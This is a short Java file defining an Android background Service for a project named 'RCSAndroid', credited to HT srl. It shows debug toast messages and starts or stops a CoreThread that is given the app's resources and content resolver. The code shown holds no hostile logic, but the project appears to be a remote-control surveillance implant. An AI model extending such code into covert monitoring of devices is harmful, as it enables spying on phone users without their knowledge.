/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.widget.Toast;

public class RCSAndroid extends Service {
	private CoreThread core;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();

		Toast.makeText(this, "Que - Service Created", Toast.LENGTH_LONG).show();
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
			
		Toast.makeText(this, "Que - Stopping thread", Toast.LENGTH_LONG).show();
		
		// Core stops
		core.Stop();
		core = null;
		
		Toast.makeText(this, "Que - Service Destroyed", Toast.LENGTH_LONG).show();
	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);

		Toast.makeText(this, "Que - Service Started, starting thread", Toast.LENGTH_LONG).show();
	
		core = new CoreThread();
		
		// Core starts
		core.Start(this.getResources(), getContentResolver());
	}
}

